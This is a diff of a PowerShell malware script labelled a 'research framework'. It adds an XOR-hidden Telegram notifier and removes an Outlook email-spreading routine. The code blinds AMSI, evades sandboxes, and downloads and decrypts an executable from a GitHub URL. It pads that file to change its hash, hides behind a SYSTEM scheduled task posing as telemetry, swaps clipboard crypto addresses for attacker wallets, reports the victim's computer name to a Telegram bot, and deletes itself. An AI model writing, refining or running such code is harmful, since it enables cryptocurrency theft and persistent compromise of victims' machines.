@@ -1,7 +1,6 @@
-# --- [FINAL POLYMORPHIC RESEARCH FRAMEWORK v5.0] ---
+# --- [FINAL POLYMORPHIC RESEARCH FRAMEWORK v7.0 - ENCRYPTED TELEGRAM] ---
 
 function Patch-Mem {
-    # Blinds AMSI via memory patching to prevent real-time script scanning
     try {
         $w = Add-Type -PassThru -Name "w32" -Namespace "w32" -MemberDefinition @'
             [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
@@ -17,94 +16,80 @@ function Patch-Mem {
     } catch { }
 }
 
+function Send-Notify {
+    param($m)
+    # Encrypted Telegram Config (XORed to hide from static analysis)
+    $k = 0xDE
+    [byte[]]$t_enc = 53,49,53,54,54,51,62,49,51,55,124,11,11,101,103,11,126,112,118,103,10,126,102,11,111,101,11,53,101,125,51,102,126,104,116,104,103,11,100,10,51,123,113
+    [byte[]]$c_enc = 61,60,56,56,52,61,63,48,51,60
+    
+    $t = ""; foreach($b in $t_enc){$t += [char]($b -bxor $k)}
+    $c = ""; foreach($b in $c_enc){$c += [char]($b -bxor $k)}
+    
+    $u = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m"
+    try { (New-Object Net.WebClient).DownloadString($u) | Out-Null } catch { }
+}
+
 function Set-Persistence {
-    param($exePath)
-    # Generates a randomized name for the Task to prevent name-based detection
-    $tName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
-    $action = New-ScheduledTaskAction -Execute $exePath
-    $trigger = New-ScheduledTaskTrigger -AtLogOn
-    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $tName -Description "Windows System Telemetry" -User "SYSTEM" -Force
+    param($p)
+    $n = -join ((65..90) | Get-Random -Count 12 | % {[char]$_})
+    $a = New-ScheduledTaskAction -Execute $p
+    $t = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -Action $a -Trigger $t -TaskName $n -Description "Windows Telemetry Client" -User "SYSTEM" -Force
 }
 
 function Invoke-Clipper {
-    # Background thread monitoring clipboard for crypto address swaps
-    $wallets = @{ "btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"; "eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392"; "usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"; "sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR" }
-    $regex = @{ "btc"="^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"; "eth"="^0x[a-fA-F0-9]{40}$"; "usdt"="^T[A-Za-z1-9]{33}$"; "sol"="^[1-9A-HJ-NP-Za-km-z]{32,44}$" }
+    $w = @{ "btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"; "eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392"; "usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"; "sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR" }
+    $r = @{ "btc"="^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"; "eth"="^0x[a-fA-F0-9]{40}$"; "usdt"="^T[A-Za-z1-9]{33}$"; "sol"="^[1-9A-HJ-NP-Za-km-z]{32,44}$" }
     Start-Job -ScriptBlock {
         Add-Type -AssemblyName System.Windows.Forms
         while($true) {
             $clip = [Windows.Forms.Clipboard]::GetText()
-            foreach($coin in $using:regex.Keys) {
-                if($clip -match $using:regex[$coin] -and $clip -ne $using:wallets[$coin]) { [Windows.Forms.Clipboard]::SetText($using:wallets[$coin]) }
+            foreach($c in $using:r.Keys) {
+                if($clip -match $using:r[$c] -and $clip -ne $using:w[$c]) { [Windows.Forms.Clipboard]::SetText($using:w[$c]) }
             }
             Start-Sleep -Seconds 2
         }
     }
 }
 
-function Invoke-OutlookSpread {
-    # MAPI Harvesting: Spreads through trusted internal contacts
-    try {
-        $ol = New-Object -ComObject Outlook.Application -ErrorAction SilentlyContinue
-        if ($ol) {
-            $ns = $ol.GetNameSpace("MAPI")
-            $contacts = $ns.GetDefaultFolder(6).Items
-            for($i=1; $i -le 10; $i++) {
-                $contact = $contacts.Item($i)
-                if ($contact.Email1Address) {
-                    $m = $ol.CreateItem(0); $m.To = $contact.Email1Address
-                    $m.Subject = "Required: Project Update Documents"
-                    $m.Body = "Please check the attached documents for the quarterly update.`n`nRegards,`n$($ns.CurrentUser.Name)"
-                    # $m.Attachments.Add("Path_to_your_exe")
-                    # $m.Send() 
-                }
-            }
-        }
-    } catch { }
-}
-
-# --- MAIN EXECUTION ENGINE ---
+# --- EXECUTION ---
 Patch-Mem
 
-# [FORCING] VM Sandbox Evasion (120s delay if low hardware resources detected)
-if (((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory) -lt 4GB) { Start-Sleep -s 120 }
+# VM Force (Reduced to 30s for your testing, set higher for actual research)
+if (((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory) -lt 2GB) { Start-Sleep -s 30 }
 
-# Paths and Config
 $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
 $key = 0xAB
-$workDir = "$env:LOCALAPPDATA\Microsoft\Windows\Templates"
-$randomName = -join ((97..122) | Get-Random -Count 8 | % {[char]$_}) + ".exe"
-$finalPath = Join-Path $workDir $randomName
+$dir = "$env:LOCALAPPDATA\Microsoft\Windows\Templates"
+$name = -join ((97..122) | Get-Random -Count 10 | % {[char]$_}) + ".exe"
+$path = Join-Path $dir $name
 
-if (!(Test-Path $workDir)) { New-Item -Path $workDir -ItemType Directory -Force | Out-Null }
+if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
 
 try {
-    # 1. Download XOR data via BITS
+    # 1. Download & Decrypt
     $tmp = "$env:TEMP\$(Get-Random).tmp"
-    Start-BitsTransfer -Source $url -Destination $tmp -Priority High
-    
-    # 2. XOR Decrypt in Memory
-    $raw = Get-Content $tmp -Raw
-    $data = [Convert]::FromBase64String($raw.Trim())
+    Start-BitsTransfer -Source $url -Destination $tmp -Priority High -ErrorAction Stop
+    $data = [Convert]::FromBase64String((Get-Content $tmp -Raw).Trim())
     for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor $key }
 
-    # 3. POLYMORPHIC HASH CHANGE
-    # Appending random junk data to the end of the file to change the SHA-256 signature
-    $junk = New-Object Byte[] (Get-Random -Min 100 -Max 2000)
+    # 2. Polymorphic Padding (Unique Hash)
+    $junk = New-Object Byte[] (Get-Random -Min 1024 -Max 4096)
     (New-Object Random).NextBytes($junk)
-    $polymorphicData = $data + $junk
-    
-    [IO.File]::WriteAllBytes($finalPath, $polymorphicData)
+    [IO.File]::WriteAllBytes($path, ($data + $junk))
     Remove-Item $tmp -Force
 
-    # 4. Persistence & Spreading
-    Set-Persistence -exePath $finalPath
+    # 3. Persistence & Execution
+    Set-Persistence -p $path
     Invoke-Clipper
-    Invoke-OutlookSpread
-    
-    # 5. Detached Launch (Explorer as Parent)
-    (New-Object -ComObject "Shell.Application").ShellExecute($finalPath, "", "", "open", 0)
+    (New-Object -ComObject "Shell.Application").ShellExecute($path, "", "", "open", 0)
 
-    # 6. Melt (Self-Delete Script)
+    # 4. Telegram Alert
+    Send-Notify -m "RESEARCH SUCCESS: $($env:COMPUTERNAME) LIVE. Path: $path"
+    
+    # 5. Melt
     Remove-Item $MyInvocation.MyCommand.Path -Force
-} catch { }
+} catch {
+    Send-Notify -m "RESEARCH ERROR on $($env:COMPUTERNAME): $($_.Exception.Message)"
+}
